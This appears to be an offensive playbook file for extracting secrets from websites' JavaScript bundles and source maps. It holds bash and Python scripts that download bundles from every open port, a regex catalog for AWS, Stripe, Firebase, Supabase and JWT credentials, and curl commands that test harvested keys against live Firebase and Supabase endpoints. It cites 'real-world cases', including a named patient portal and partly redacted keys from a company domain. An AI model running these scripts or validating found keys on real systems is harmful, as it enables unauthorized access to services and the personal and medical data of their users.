---
name: js-secrets-extraction
description: "Analyze JS bundles and source maps for hardcoded secrets, API keys, JWTs, and internal endpoints"
sources: field_ops, real_targets
report_count: 30+
---

# JS Bundle & Source Map Analysis -- Secret Extraction

## When to Use

- **ALWAYS** after initial web enumeration
- When you find modern SPA (React, Angular, Vue)
- When target uses Firebase, Supabase, Auth0
- Higher yield than directory scanning on many targets

## Why Analyze JS Bundles

Modern JavaScript bundles (Webpack, Vite, esbuild) often contain:
- Hardcoded API keys and tokens
- Internal API URLs
- Firebase, Auth0, Supabase configurations
- Environment variables (VITE_*, REACT_APP_*, NEXT_PUBLIC_*)
- Internal routes

## Bundle Download and Analysis

```bash
curl -s "https://target.com" > index.html
grep -oP 'src="[^"]*\.js"' index.html | cut -d'"' -f2 | while read js; do
  curl -s "https://target.com$js" > "$(basename $js)"
done

# Search for secrets in bundles
grep -rPn "(apiKey|api_key|API_KEY|token|secret|password|clientId|client_id|auth0|firebase|supabase)[\"'\"]?\\s*[:=]\\s*[\"'\'][^\"'\']{8,}" *.js
```

## Source Map Reconstruction

```bash
curl -sI "https://target.com/assets/index-abc123.js.map"
curl -sI "https://target.com/static/js/main.12345.js.map"

# If HTTP 200, use for reconstruction:
# https://unminify.com
# https://source-map-visualization.netlify.app
```

**Real-world case**: Enterprise Angular SPA admin, 2 JS bundles (250KB each) exposed:
- Internal API URL (apiv3.empresa.com.br)
- Firebase API key (AIzaSy...2GXA)
- Encryption keys (AD5oDjsJaTJOzLe1Llj9mz)
- Cloudinary upload endpoint

## Port-Specific URL Analysis

Modern deployments often serve the main SPA on port 443 and admin/API on separate ports (8080, 8081, 8084). **Always check JS bundles on ALL discovered ports:**

```bash
# Check source maps on every open port
for port in 443 8080 8081 8084; do
  curl -sI "https://target.com:$port/static/js/main.*.js.map" 2>/dev/null
  curl -sI "https://target.com:$port/assets/index-*.js.map" 2>/dev/null
done
```

**Real-world case (patientportal.com, June 2026):**
- Main SPA (port 443): 500KB bundle, no source map
- Admin Portal (port 8080): 1.15MB bundle + **source map at `/static/js/main.a5a4e0fb.js.map`** (HTTP 200)
- Source map revealed: 1,208 source files, API backend at `https://patientportal.com:8081`, auth services, dashboard APIs, pharmacy/drug/hospital components

## Admin Portal JS Analysis Pattern

When you find an admin portal on a separate port, the JS bundle often contains different secrets than the main site:

```python
base = "https://target.com:8080"  # Admin portal
js = requests.get(f"{base}/static/js/main.*.js").text

# 1. Extract ALL API URLs
api_urls = re.findall(r'https?://[^\"\'\\s\\n,)>\\]]+', js)
# 2. Find base API URL (the backend this admin talks to)
# 3. Look for hardcoded credentials, API keys, auth patterns
# 4. Extract route paths for the admin app
routes = re.findall(r'[\"\'](/[a-zA-Z0-9_/.-]*(?:admin|chat|bot|message|user|auth|login|token|config|setting|dashboard|hospital|pharmacy|drug|payment)[a-zA-Z0-9_/.-]*)[\"\']', js, re.IGNORECASE)
```

## Source Map Content Analysis (1,200+ Files)

When source maps are available, analyze the `sourcesContent` array for hardcoded secrets:

```python
import json, re
data = json.loads(open("bundle.js.map").read())
all_source = " ".join(data.get("sourcesContent", []))

# Search for credentials in the original source
patterns = {
    "password": r'[\"\']([^\"\']*(?:password|passwd|pwd)[^\"\']*)[\"\']\s*[:=]\s*[\"\']([^\"\']+)[\"\']',
    "token": r'[\"\']([^\"\']*(?:token|jwt|api_key|apikey|secret)[^\"\']*)[\"\']\s*[:=]\s*[\"\']([^\"\']+)[\"\']',
}
for name, pat in patterns.items():
    matches = re.findall(pat, all_source, re.IGNORECASE)
    if matches:
        print(f"[{name}] {matches[:5]}")
```
- Cloudinary upload endpoint

## Secret Regex Patterns Catalog

```python
import re

patterns = {
    "Firebase API Key": r'apiKey:\s*[\"\']([^\"\']{30,})',
    "AWS Key": r'(?:AKIA|ASIA)[A-Z0-9]{16}',
    "Google API Key": r'AIza[0-9A-Za-z\\-_]{35}',
    "JWT": r'eyJ[A-Za-z0-9_\\-]{20,}\.[A-Za-z0-9_\\-]{20,}\.[A-Za-z0-9_\\-]{10,}',
    "Mercado Pago": r'APP_USR-[a-f0-9]{8,}',
    "Stripe": r'(?:sk_live|pk_live)_[A-Za-z0-9]{24,}',
    "Auth0 Domain": r'(?:domain|auth0_domain):\s*[\"\']([^\"\']+\.auth0\.com)',
    "Auth0 Client ID": r'(?:client_id|clientId|AUTH0_CLIENT_ID):\s*[\"\']([^\"\']{20,})',
    "Supabase URL": r'(?:supabaseUrl|SUPABASE_URL):\s*[\"\'](https://[^\"\']+\.supabase\.co)',
    "Supabase Key": r'(?:supabaseKey|anonKey|SUPABASE_ANON_KEY):\s*[\"\'](eyJ[A-Za-z0-9_\\-]+\.[A-Za-z0-9_\\-]+\.[A-Za-z0-9_\\-]+)',
    "Heroku": r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
    "Generic Secret": r'(?:secret|password|token|key):\s*[\"\']([^\"\']{8,})',
}
```

## Batch Bundle Download + Grep

```python
import requests, re, json

base = "https://target.com"
html = requests.get(base).text

# Extract all JS URLs
js_urls = re.findall(r'src="([^"]*\.js)"', html)
for js_url in js_urls:
    if js_url.startswith("/"):
        js_url = base + js_url
    content = requests.get(js_url).text
    for name, pattern in patterns.items():
        matches = re.findall(pattern, content)
        for m in matches:
            if isinstance(m, tuple):
                m = m[0]
            if len(m) > 6:
                print(f"[{name}] {m[:80]}")
```

## Pitfalls

| Issue | Solution |
|-------|----------|
| Bundles too large | Use grep -oP with specific patterns |
| Minified code (1 char names) | Use source maps for reconstruction |
| False positive matches | Validate keys by testing API endpoint |
| Rate limiting | Add delays between bundle downloads |

## Verification

```bash
# Test Firebase API key
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIza..."
# Test Supabase anon key
curl -s "https://PROJECT.supabase.co/rest/v1/users?limit=1" -H "apikey: ANON_KEY" -H "Authorization: Bearer ANON_KEY"
```
